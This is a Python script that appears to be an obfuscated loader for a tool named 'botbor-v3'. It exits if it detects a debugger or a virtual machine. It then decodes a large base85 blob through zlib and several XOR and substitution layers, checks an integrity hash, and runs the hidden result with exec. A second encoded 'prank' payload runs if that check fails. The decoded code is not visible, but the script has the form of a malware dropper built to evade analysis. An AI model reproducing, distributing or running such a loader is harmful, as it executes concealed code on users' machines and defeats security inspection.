#!/usr/bin/env python3
import base64,zlib,hashlib,sys as _s,os as _o,time as _t,platform as _p

# Anti-debug
def _ad():
  if hasattr(_s,"gettrace") and _s.gettrace():_s.exit(1)
  if _p.system()=="Windows":
    try:
      import ctypes
      if ctypes.windll.kernel32.IsDebuggerPresent():_s.exit(1)
    except:pass
  try:
    if "PYDEVD" in str(_s.modules) or "pydevd" in str(_s.modules):_s.exit(1)
  except:pass
_ad()

# Anti-VM
def _av():
  vm_indicators=["vmware","virtualbox","qemu","xen","docker","hyperv"]
  try:
    bios="".join(open(p).read().lower() for p in ["/sys/class/dmi/id/sys_vendor","/sys/class/dmi/id/board_vendor"] if _o.path.exists(p))
    for v in vm_indicators:
      if v in bios:_s.exit(1)
  except:pass
_av()

# Decoder
def _D(x,d,k):
  kl=len(k)
  return bytes(x[i]^k[i%kl]for i in range(len(x)))

def _AES_D(data,key):
  box=list(range(256))
  ksum=sum(key)
  for i in range(256):
    j=(box[i]+key[i%len(key)]+ksum)%256
    box[i],box[j]=box[j],box[i]
  # Build reverse box
  rbox=[0]*256
  for i in range(256):rbox[box[i]]=i
  result=bytearray()
  prev=key[0]
  for b in data:
    orig=rbox[b]
    result.append(orig^prev)
    prev=b
  return bytes(result)

_K1=[167, 147, 75, 112, 130, 109, 87, 138, 56, 76, 33, 245, 211, 232, 25, 108, 180, 47, 122, 193, 94, 150, 13, 131]
_K2=[107, 57, 88, 50, 109, 80, 55, 118, 76, 52, 110, 81, 56, 119, 82, 49]
_K3=[131, 13, 150, 94, 193, 122, 47, 180, 108, 25, 232, 211, 245, 33, 76, 56, 138, 87, 109, 130, 112, 75, 147, 167]

_P="c-qZY-D=w~6u$RUoVXWBAaT>>t`N4cAGVf-()O}o6#Li~u_YtP>%!RmE>~DqD1<TCll2Mq2s?68*J&GAy3$oRa;&5CN#Bul^lde^3$3=tTx_HG0QuA;QuH0ybq^F169{C8pc8p2;50!2T4pE(f>9hb7zrVkUB=RQ`IOuop5;;*&{N$3Nk79g>;Qp<GIN{|Bk*$z-D>YTKt*bg`Wnny%^=lH;E`<-EJGL!pealfFx3cTMW&kV(kWM5m{$G23vfC6b~*d{RG)MA)^yKc^Fm&C16_Xqa`Ty;|9xv^yVs~y<gZ}Xw$CnBTdF0SKLB3>o3CrHP4?{G(OubL^R?_BW~_y4?W=D17yRWK%$MD&uexEi(<bl_wxi239K9OC{_D{Y4i1N-{RaI0@$2XRn$kPLVO&g@&4YysaFHIFPPw-k(9y!(dV(%OmO#k6C`z~xMNA{Gj0x}YsO_<G)Ig3|*H%}Fy{sf9>=;tUMdR^i^qv)vvkBw&ase**^LqllOqhWeGLt!r)083&$CzTQShgWhAxtrWkmZDz@&E;0OB0;J)JErM_||*W{dn<&FT1&W`<^bVEf@+Rr<?*7NQ!4j%AzzxQURw`wn`z!R=)$i4s>^xBH<b<a!(YUpHeZ9Feyp|>-UL&_B_w+0E%$n(mP5EoeYjuf$a*ziV;tzh<R&gC7^3Sdjz?3UC-#S)HYyHWn8cnFp4lRy0q5ROk<&Dt_fMnevNXC>kVOqK_a0`vdcX=>Gk`8+iaHuqefGWyW(6U+Vh^(rdw^Gy+Rw9@G!J%vD=0bX*tR{F(n`pc;3zZ_J$^_kl4{->_CjyCm>QpzB*oago#*q_>r4dukAP#5Z|})@O`WAT;I<qt@ysXAb+I|oj+<=!G-"

# Reconstruct data
_c0="c-jF}5v%S^hZdC?eP>Vs^1Q^8taA9-@<hl<(DTOQT#leNnK=5+d-_i8;uoM~zD|erzu&>v-r3L;;UIndwG<YKt`k{tSG-aI0T8n-7dbY@;^FG^e?a53?E;;zbND4JmTJz7R*d{3I4tHRv9!frmxoiu32pNVhqxWDa#47V{|?{L9xlUz*eueN<Xl0BE+xI+UFsI4l{U$?9LjTIxwH$&+bA5usTiH>NPLhahd};6Vki_3vOV=RGv}>>j5()BrQAbbma?Gr<(2yRya&^7v>5_2*=p3Z6elbKwpi)Z+Gs?`5}jGm=<yMWC@>hQx6E*X!aOEgK&7%v&}7XrVI=xZ*+?N}3=t498oBKAWbm1oOr0T*wHsUVt<?PC3Jf)kXCm0*@R~Xf0ot>U&VKgQd6`=>+IPJqV}}vGw^CQp0^2Uib*;b8LA)8c9&8??V5gRGlQy>IH<XoNG00VaJu6XVZtYa}bg=B{ONPt|BbzJSR-!Wx`{elaeVvAwoyRd$sF+^SE;2cd(4mZ>(@!>tz1XC7eQ|Ic5n@WnNfQ4kNc40zbs%A_)@sZQ^OIJ;ORHLYsc)HydJ(ktck1JmE?H<T7eSN7QwQo8fW;I1;e}FJDq`IZC*`Uhn(P}3$uYWxD4aL4fE-LG3mJA)aR5i)z0Td*!p|yD^ass^hhDud`A3VAGi?#9RY8wNlU5cIY3PKWooG=uiCv4#S+enY_#6r+BQ41Y%UiO5N`s*9XG5gVGrRdZC?tnKP<b3?wt{KK)_N|hK#<kfdWIeLd(bj~Ei%uQzhsVZ?7?X&3Wvp@T>}|iKE<?g<EC1Uyr^Egv7;8Fq!X9q8)<eOK2)RAnFJ*DL)3W1Ifo&$y^0)W^ZB_}^GAR{hLG*~Ep|k^EVy+arpD>q^p7irXNdiD4fbOffT0Pk|5eUVO@WvW=%Q5;KHdQyU?ofRVU*aB;*_3fuTY47L~Ql%21?fXO%tu9%o(nlhNhNP&>ovj1CGX0WB<=2gV&L?Ey8{QUiu|G`AP<5if`URTpd{oH|taP3O~*zuP;oD!`xmp=EK@$3+1-p7ELw|8;U*=HGluroUQxTJkO73lKbj*|2n8K-x~Q23j~v!y-K+~wfth&6v#8T7H^6jDyi$~m!`^lEFIf^%i-ownt8x@VkK(4CpY55Bu6qe@EQ)Ir@dW+yWzhDM_JqEZxa1q8JEh(%K4U+X5P=!W({d8oWpaFT=d*!j@<|vt0{Q;3Ukaml6ixM4B$R8xF8J}f6DByktfN*&-S~rZr;tE4zZR61%~q#x`e^z-*BhJDlQ)=<kBlDub;Fb=K`Ixk_Lq2exZBd<XvbDnmFQ_+U;p%r5-^@FPX0ckGjlIyC1qwp6w-^o1`=8ci3W?-7&*%*^Gn%DgR=TSEc+l<BTvWR7O!Y<qi5?kO6|heOcAttJ3Wj?3g1ZJ-hZfVEU-Hkr)8F)+9I;TefRu!~PG+7P5AO&{ASI5Jmv3D;#;bN_OD-%GaS4fC5`S_doNo<ccLGnu+~m3nhBBw~kKq{NM+o>N(~abqw4ufxr4j`pjA<{uO$x;tpFr<03E{g0xGfmQ<Q(xkok}G{<k-;wEsuVuDm@EZPe!KN1e!$>tN|TNaRotQW2|8Tvh2O|}h~@J(B$(|>1JG!7)`c9!fYbZj1@k=>9n5Dd;`<gv|$-LHn$N8Mt|c|xS`VV86S_s7y`9Oa415NZCyRbu@UJa#Fwi^u8GzsfhrstA3-A6sO9ry<wB(_5RCTZp)Beu_OZ2k0EW+as#xPMhUFH|bbAHiHWWx^{NQBP<&J1|==m!j=16K@;Pil=qW2i*k%EL}uRjE*>RwD%5XQyD}`T-a!a?x~+@PnDRm%s$54JJF|Cg1_-H($E&gmyq}<$S9bdJ&{FDxHa3qXH{AHAMk1;R0C6cu5hscyBP}g#scPK`9o2k;E}J`t!=?Z8-Nw;j=Fq-8x2S#VLzoCLqSeRrU6hk(9jjp!ll#2WZqK8ZOR9oyEKFFK@U1-vZ-82rc*vvU6`URv$KU=F!q_DQ&C5fqRaQUz"
_c1="B0l!Qs608H&p5IAdmxoj=gi+5ZMuPHwh$!OZ|bC55he4nMYo_Rm2RV0TSg=l&uCW!-dgE01%rqS%MnmcP9q-BuO_V}IYG_KZ{H!I|5c8GG7G%krm(LG75TY*0(TTOA%QJ<CnX$z2{m_UfkaI>4(K|0y}({A@jdv2BG8`+8ho!k5DZ(Di|e2v8!2G*<pS?$aLM?#Z&H8oUF{<N!aQ~kyj)$(AGs&YxxYv5XE1FGw17mE;^DvZ;S@ambfb*3Tr>}7`G2oS7N&d7HwEP~8ZV$loDrvp@fnq0i2i|w5`-OU^+zv&>WCv6hm|i1I5lB|21`Pzbw`p!(0Ivju!Ui!G-xVzF~l)hl5zwY;=Nt)g_X35MJLYs`edxAD<%K2`p<RHJpW`3=SjHzxe)fsy}aruNIrVNoU4)V#0UiN*giJ=Asp%$X)-%eb~Peq7peWz0(?QK?mQ@covuh$<Ty1+o4E|K?3Hyq36$+OC;-dv@q`WgQzZi4E^f>Wrj!*8I1&k!V4<&8M~(Y2NH_41Ijw-D?4=Dl-8OaC6Phb3uqqYLLGy9}PD15ug|v)s1rrW{ya{ipOILhq{zLhsGILxIG!#&5%2H(lPR*$@ioGCtt2oR`QKGo`exXZQm^N>&oGKbNuD4h?f2xy|wGjIEQypp>>&HX9pM_sipY2mq0g3cQK;<(}T5%CcXsQ5F)?|-fimdW(wt`pgs2d3+`O)dgLV0K{9V_N>+=FjTKNRoB(+m>A!L<99N0jZ714d{EpHg&6KkC7hOYCi&fuzRtEZ?7ZNqqYm&MX-NmaJ4+?cW43@P8Puz4`w@wtf4$n}@&icAR3YxLW-)c<Owa-W#1&HdNJT{{<D#*c{4AX#C4=;9sV2WGT^ZE(PV(U&a701L+Y&e96K7StLTH*>8<I4UpRTY4(WfbgAoGVZ{ngxGAIT(DLc*l~5l~nEgXkhW6R^57Kvcdf*L>RtFC`O)nq7v!~^?2Nl|TJwv_vVKzmt{<oV=D~JpXRN`%U@gS@<f7>8@$>Or?0U-6uRI8Lm?1GG+Mjx~iQFqK#9!6?h3^6*C{{2G%k*F$k&sD=Cvk8UNfx1TkD1^!3$LleB#;IWtlpu>hJ@ggAF*YDn4+G^*K_|Q4024JpLILO<c87pU0d-8N&TA}t&htZ+5XvwmrQ(WP2kfG8=5hou*Ghn|aIiX%IzKebCiz-xev{kQ&p?;-W+{;CoDQOP2ikul4BIZxrV4J_%s5pQ%%Fj!_9H$1I34fvbY`+Y$xM#qty-7#)JRw2DH?B0ovuh$<Ty1+o4E|KP$VroxZJF`TDFbD#kEa#f4xi=UZ2{v*zR)@C+wv~HvhT3b;K$j+mL?>=OWNw9Tj4Ow!}S<a+WJ9xQOJQy=%u`WB4T|`ETCMS?wLLd)TN>j$sVX#YK@f8RtjP+$cY-?K=t~2ys=A9Li5bq;w-Buh|C5?6nO>`hLHRSbT6iAnQXd!w827gC;5YRbtZEk8*d$>q%Jzn6DTQ%L>M?kc`TL>P<hRK7@<1%sF77c>>Lt1~s+@oGOiq=`D)n?Z4V8rfBe!>AsPu<8&jeEN`WffuzRG@cn20y3E1E9!vMb<FOm5jn{B@bl@F6WQG7dS*ZMcYE^WmVE>qK`x^k6GVq{X4+0qQ=~!72$p7rJHa3qXH{1j<*Ka<tY`FTUXN_^;&`4K(hWG<P%4EQ`v8Ax$9PM)YjX(sltGYiVa!y@$`CI?C#jxiNG0#+Amkjg!lpF4s?~(`0TwiV_qx@@*PrUzQWg2Z89X`WeIprH`v%}B5dCK()yat*k9kx<)RH1}~bJ$+N6vz}o){OiLnI8h)$wcLXTsQ^Qo%VC9f&or%86v9V;n2xX&~l%OA3kvxg)W<}YVMl;cfbqFX`Bt$&njKM;h3VZabqy+S^J!y-HdziCX0^jTKSIeQlXTt74$1Ql`(z|4G`}L`jEj-vHOs1H82A&QV;pZdU5~K!S&!N(#=92#BbniGtIY@t`kxB?>1aWLbe%16EZAp2qn`r*<+?lnCB7VvC*DY+xz0E"
_c2=";4BgF^hX)BE?@SFR=L}JtBKs?d%k>3*i;Kaqk)#_n`kI~A+wZ+<jo5G;@M8AE)hpzYayL?=9>GY;(hoV`rwfCasABfdtS5eGA{e}CzH$tq^QMJ5`8`;JVIv+B1Y~Pe**GoB<c8mpgJs9Y$eTsXV4XWm&1NBT<<_Am7Ii)B(g`_Q)whz>Sj+p3p>&=@&R+0u`TreVoGZ8{cSCK^F<BelC)bJ`Tsfi1l|PBGYGYuJuS-cj}|xOn~Ng}-e(|_w!#vy4{|+tO4-yBK=fVv!o~6px~aQTF?P)FrNko!;BlP!f;8rI$p@tLx0H#PVQs^~Nk7gHJa*8Vv<^aiPJBUg^LWX&kU}<A<Q9#pePE^Lkxmi1J_l;VXHhTg^g9v*UD^i){J(Q%g?s8s*z$6al%FLLQG7>`Q_8qp4VXj?`|M;(G+R7t1d~vS7??GcxdeGo!4X<}!~O1nvH@#nmG`mI|2~3aF0G(8tpl7+_6L-}4MpkZhcV6!`dgSyi++f)A+FaP;!~C(JbTt!@G>%X#l%J#8s^IN8C;?&wcAME3FHV7<C<Nau{TcRHOi&$YI!``L+$!nm$A)>dfovX5$No%C`T3t5;WCN!s7k62!a=tdINA;>y>>v+Fx-4o{r(TZ(P}W%<+>{*Y*j%x0Svw?mEmF-VdAEgRtjN156K|-_Lc-4jMd+tfe3O!cviL#H|Uw2rHxbes_%ci?2Tic{1H_>yT5zF;arwfC?HYQm6;sCJsh$Tgq1?Fg5R|x==j{l6M~|UGPN!&c4-2g$k@SC(MFW9$vF^iNfs*==>0}twwu{!j&%d*{P!8o`(1?bmj4RN&l*76tLygfsbw5#^z^69Af^wNMe0RYrKTE;aqidV)|@`qAx)5a%~?q2bjkAM#RT*jRgN86S;Yl$kCFuuGH4ea0xi~UdlKQgV&L?Ey6vkg3~&=Syr<O0C6cIQ|A({WEXO3t7RZjK(c|4RyTstOx~YnnH%ux@R;BX1W}q#%1iI>q?SX=qtVDFv_j!E8jIGxUhY#=Hu#zTzr)WXc)RDccd)nMDAG3vwLanuUIQq6#z1yd2DWa*>&6U?9+Em_kVRdsc-rB(GE5r(OPw&ypE)L9(JVM^c$xbpbmJqPgb$KGwM`EB+!XWe;I~+e<2wa<-jPU1e?=Ci**v`tbCRx55$Ffdy*h#Pnjyq}>)&Y-4g>BNrU%Q#PH{94^t>GK-aZA6z~Gnk@XFFPnNTlvAnOp&+$S3-@A=cYBSFR)Z$*3oq5~)CoJ_Li3*fsJrb78wxmL&`>6iq|Q*~rfiI%oMej`b^H9rJhwRMDKzv@vQ>4;a^Y(i~378v6s6nkKCa`W#y^aUL{?X1?fAfnCt6eeFxcp3q0cG$YEtYWznWMGEpXIPX1GRJ1FM1DoD1niwUX@6a>`f_QgFq2K$-3#a(0e3l3_3^Zo{U1Mzu!Cb*RFdK`$_$%*V8x*CFusvNbBg`JGXu-Zz__1Z={pVQ@$LH=G?&3^m)LB?!hZV&pWI_|w+^%p%CLARw#gfEwH8Tl<ogLOBg{cu&;S~;N#STqb3`(Od&T@mPFgR<NET2e>jIrKGuys`j-Im"
_E=_c0+_c1+_c2

# Main
try:
  _z=base64.b85decode(_E)
  _x=zlib.decompress(_z)
  _x=_D(_x,_K3)
  _x=_AES_D(_x,_K2)
  _x=_D(_x,_K1)
  _p=_x.decode()
  if _p[:4]=="#IB:":
    _ib=_p[4:28]
    _c=_p[29:]
    _ch=hashlib.sha256(("botbor-v3-secure-2024"+_c+"botbor-v3-secure-2024").encode()).hexdigest()[:16]
    _ch2=hashlib.md5((_c+"botbor-v3-secure-2024").encode()).hexdigest()[:8]
    if _ib!=_ch+_ch2:
      # TAMPERED - show prank
      _pz=base64.b85decode(_P);_pc=zlib.decompress(_pz).decode();exec(compile(_pc,"<botbor>","exec"));_s.exit(0)
  exec(compile(_p,"<botbor>","exec"))
except Exception as _e:
  # Only prank on integrity failure, show real error otherwise
  _em=str(_e).lower()
  if any(x in _em for x in ["decode","decompress","integrity","utf","codec"]):
    try:
      _pz=base64.b85decode(_P);_pc=zlib.decompress(_pz).decode();exec(compile(_pc,"<botbor>","exec"))
    except:print("\n  [FATAL] Source integrity FAILED. Contact @machine_id_bot");_s.exit(1)
  else:
    raise